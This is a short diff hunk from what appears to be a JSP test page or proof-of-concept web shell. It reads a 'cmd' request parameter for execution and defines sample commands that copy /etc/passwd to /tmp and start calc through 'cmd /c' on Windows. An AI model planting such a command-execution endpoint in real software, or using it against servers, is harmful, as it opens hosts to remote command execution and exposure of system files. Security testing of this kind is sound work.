@@ -10,7 +10,7 @@
 
 <%
 String linux_querystring = "?cmd=cp+/etc/passwd+/tmp/";
-String windows_querystring = "?cmd=calc";
+String windows_querystring = "?cmd=cmd+/c+calc";
 String cmd = request.getParameter("cmd");
 if (cmd != null) {
 	try {
